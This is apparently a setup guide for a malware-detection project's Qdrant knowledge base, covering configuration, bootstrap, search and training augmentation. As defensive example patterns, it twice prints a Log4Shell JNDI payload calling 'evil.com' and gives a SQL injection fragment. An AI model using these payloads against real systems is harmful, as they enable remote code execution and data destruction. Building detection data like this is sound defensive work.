# Qdrant RAG Setup Guide

## Overview

ScriptGuard uses Qdrant as a vector database for two key purposes:

1. **Training Data Augmentation**: Enriches training dataset with CVE patterns and malware signatures from the knowledge base
2. **Inference RAG (Retrieval-Augmented Generation)**: Provides context during malware detection for improved accuracy

It stores CVE patterns, malware signatures, and vulnerability information as semantic embeddings for similarity search.

## Automatic Initialization

**Good news!** Qdrant is initialized automatically when you:

1. **Run training**: `python src/main.py`
2. **Start API**: `uvicorn scriptguard.api.main:app --reload`

The system will:
- ✅ Check if Qdrant is running
- ✅ Create the `malware_knowledge` collection if needed
- ✅ Bootstrap with initial CVE data if collection is empty
- ✅ Continue without RAG if Qdrant is unavailable (non-blocking)

## Quick Start

### 1. Start Qdrant Container

```bash
docker-compose up -d
```

Or manually:
```bash
docker run -p 6333:6333 -p 6334:6334 \
    -v $(pwd)/qdrant_storage:/qdrant/storage \
    qdrant/qdrant
```

### 2. Verify Qdrant is Running

```bash
curl http://localhost:6333
```

Expected response:
```json
{"title":"qdrant - vector search engine","version":"1.x.x"}
```

### 3. Run Training or API

The system will automatically initialize Qdrant:

```bash
# Training automatically initializes Qdrant
python src/main.py

# Or API
uvicorn scriptguard.api.main:app --reload
```

You should see in logs:
```
✅ Qdrant initialized with CVE patterns
```

## Manual Bootstrap (Optional)

If you want to manually initialize or reset Qdrant:

```bash
python scripts/bootstrap_qdrant.py
```

This script:
- Creates the collection
- Populates with 7 initial CVE/malware patterns
- Tests search functionality
- Shows collection statistics

## Qdrant Dashboard

Access the Qdrant web UI:
```
http://localhost:6333/dashboard
```

Features:
- View collections
- Browse vectors
- Test searches
- Monitor performance

## Configuration

Edit `config.yaml` to customize Qdrant settings:

```yaml
qdrant:
  host: "localhost"
  port: 6333
  collection_name: "malware_knowledge"
  embedding_model: "all-MiniLM-L6-v2"
  api_key: ""  # For Qdrant Cloud
  use_https: false
```

### Environment Variables

Alternative to config.yaml:

```bash
export QDRANT_HOST=localhost
export QDRANT_PORT=6333
export QDRANT_API_KEY=your_key  # Optional, for Qdrant Cloud
```

## Initial Data

The bootstrap process adds these CVE patterns:

1. **CVE-2021-44228** - Log4Shell (JNDI LDAP injection)
2. **CVE-2014-6271** - Shellshock (Bash command injection)
3. Python `eval()` with user input
4. Python reverse shell patterns
5. Command injection via `os.system`
6. Unsafe pickle deserialization
7. Base64 encoded payloads

## Usage in Training

### CVE Pattern Augmentation

Qdrant patterns are automatically added to training data when enabled in `config.yaml`:

```yaml
augmentation:
  use_qdrant_patterns: true  # Enable CVE augmentation
  qdrant_format_style: "detailed"  # Format style
```

**Format Styles:**

1. **detailed** (recommended): Full context with CVE ID, severity, and pattern code
   ```python
   # Vulnerability: Log4Shell RCE
   # CVE: CVE-2021-44228
   # Severity: CRITICAL
   # Known malicious pattern:
   ${jndi:ldap://evil.com/a}
   ```

2. **pattern_only**: Just the malicious code pattern
   ```python
   ${jndi:ldap://evil.com/a}
   ```

3. **description_only**: Description as comments
   ```python
   # Log4Shell RCE vulnerability
   # Pattern: ${jndi:ldap://...}
   ```

### Training Pipeline Integration

During training, the pipeline:

1. Fetches data from configured sources (GitHub, MalwareBazaar, etc.)
2. Validates and filters samples
3. Balances dataset (malicious/benign ratio)
4. **Augments with Qdrant CVE patterns** ← New step
5. Preprocesses and tokenizes
6. Trains model with augmented data

**Example training logs:**
```
INFO | Starting Qdrant augmentation with 8,432 existing samples
INFO | Found 7 patterns in Qdrant collection
INFO | Added 7 CVE/pattern samples from Qdrant
INFO | Final dataset size: 8,439 samples
INFO | Augmentation added: 7 samples (0.1%)
```

### Benefits

- **Known Vulnerabilities**: Model learns to detect CVE patterns explicitly
- **Zero-Shot Detection**: Better at detecting variations of known exploits
- **Continuous Learning**: Add new CVEs to Qdrant without retraining entire dataset
- **Up-to-Date Knowledge**: Keep model current with latest vulnerability patterns

### Disabling Qdrant Augmentation

Set to `false` if you want training to use only collected data:

```yaml
augmentation:
  use_qdrant_patterns: false
```

## Adding Custom Patterns

### Via Python API

```python
from scriptguard.rag.qdrant_store import QdrantStore

store = QdrantStore()

# Add custom vulnerability patterns
custom_patterns = [
    {
        "cve_id": "CVE-2023-XXXXX",
        "description": "Custom vulnerability description",
        "severity": "HIGH",
        "pattern": "malicious_pattern_here",
        "type": "vulnerability"
    }
]

store.upsert_vulnerabilities(custom_patterns)
```

### Via Script

Create a file `custom_patterns.json`:

```json
[
  {
    "cve_id": "CVE-2023-12345",
    "description": "Custom SQL injection pattern",
    "severity": "CRITICAL",
    "pattern": "'; DROP TABLE",
    "type": "vulnerability"
  }
]
```

Load it:

```python
import json
from scriptguard.rag.qdrant_store import QdrantStore

with open('custom_patterns.json') as f:
    patterns = json.load(f)

store = QdrantStore()
store.upsert_vulnerabilities(patterns)
```

## Searching the Knowledge Base

### Programmatic Search

```python
from scriptguard.rag.qdrant_store import QdrantStore

store = QdrantStore()

# Semantic search
results = store.search("remote code execution python", limit=5)

for result in results:
    print(f"Score: {result['score']:.3f}")
    print(f"Description: {result['payload']['description']}")
    print(f"CVE: {result['payload']['cve_id']}")
    print("---")
```

### Search by CVE ID

```python
results = store.search_by_cve("CVE-2021-44228")
```

### Search by Severity

```python
results = store.search_by_severity(
    query="injection attack",
    severity="CRITICAL",
    limit=10
)
```

## Collection Management

### Get Collection Info

```python
info = store.get_collection_info()
print(f"Vectors: {info['vectors_count']}")
print(f"Points: {info['points_count']}")
print(f"Status: {info['status']}")
```

### Clear Collection

```python
store.clear_collection()
# This will recreate the collection (empty)
```

### Delete Specific Patterns

```python
# Delete by IDs
store.delete_by_id(["pattern_id_1", "pattern_id_2"])
```

## Troubleshooting

### Issue: "Failed to connect to Qdrant"

**Solution:**
```bash
# Check if Qdrant is running
docker ps | grep qdrant

# If not running, start it
docker-compose up -d

# Check logs
docker logs scriptguard-qdrant-dev
```

### Issue: "Collection already exists"

This is normal - the system checks if the collection exists before creating.

### Issue: "Unhealthy container"

```bash
# Restart Qdrant
docker-compose restart

# Or recreate
docker-compose down
docker-compose up -d
```

### Issue: "Out of memory"

Qdrant needs sufficient RAM for vector operations:
- **Minimum:** 2GB RAM
- **Recommended:** 4GB+ RAM

Adjust Docker memory limits if needed.

### Issue: "Slow searches"

Optimize with indexing:
```python
# Rebuild index
store.client.update_collection(
    collection_name="malware_knowledge",
    optimizer_config=models.OptimizersConfigDiff(
        indexing_threshold=1000
    )
)
```

## Performance Tips

1. **Batch Upserts**: Add multiple patterns at once
   ```python
   store.upsert_vulnerabilities(patterns)  # List of 100+ patterns
   ```

2. **Use Filters**: Narrow search scope
   ```python
   results = store.search(
       "exploit",
       filter_conditions={"severity": "CRITICAL"}
   )
   ```

3. **Adjust Threshold**: Control result quality
   ```python
   results = store.search(
       "malware",
       score_threshold=0.7  # Only high-similarity results
   )
   ```

4. **Index Optimization**: For large collections (10k+ vectors)
   ```yaml
   # In Qdrant config
   hnsw:
     m: 16  # Connections per node
     ef_construct: 100  # Build quality
   ```

## Production Deployment

### Qdrant Cloud

For production, consider Qdrant Cloud:

```yaml
qdrant:
  host: "your-cluster.qdrant.io"
  port: 6333
  api_key: "your_api_key"
  use_https: true
```

### Persistent Storage

Ensure data persistence:

```yaml
# docker-compose.yml
volumes:
  - ./qdrant_storage:/qdrant/storage
```

### Backup

Regular backups:
```bash
# Backup Qdrant data
tar -czf qdrant_backup_$(date +%Y%m%d).tar.gz qdrant_storage/

# Restore
tar -xzf qdrant_backup_20240201.tar.gz
```

## Monitoring

### Collection Stats

```python
info = store.get_collection_info()
logger.info(f"Collection health: {info}")
```

### Search Performance

```python
import time

start = time.time()
results = store.search("test query")
duration = time.time() - start

logger.info(f"Search took {duration:.3f}s")
```

## Usage in Inference

During inference (malware detection), Qdrant provides contextual information:

```python
from scriptguard.inference import ScriptGuardInference

analyzer = ScriptGuardInference(
    model_path="./models/scriptguard-model",
    use_rag=True  # Enable Qdrant RAG
)

result = analyzer.analyze(script_code)
# RAG provides context from similar CVE patterns
```

The system:
1. Embeds the input script
2. Searches Qdrant for similar CVE patterns
3. Uses context to improve detection accuracy
4. Returns results with relevant CVE references

## Next Steps

- [TRAINING_GUIDE.md](TRAINING_GUIDE.md) - Train models with RAG augmentation
- [TUNING_GUIDE.md](TUNING_GUIDE.md) - Optimize augmentation parameters
- [USAGE_GUIDE.md](USAGE_GUIDE.md) - Use RAG in production
- [API Documentation](../src/scriptguard/api/README.md) - RAG API endpoints

## Resources

- [Qdrant Documentation](https://qdrant.tech/documentation/)
- [Vector Search Best Practices](https://qdrant.tech/articles/vector-search/)
- [Qdrant Python Client](https://github.com/qdrant/qdrant-client)
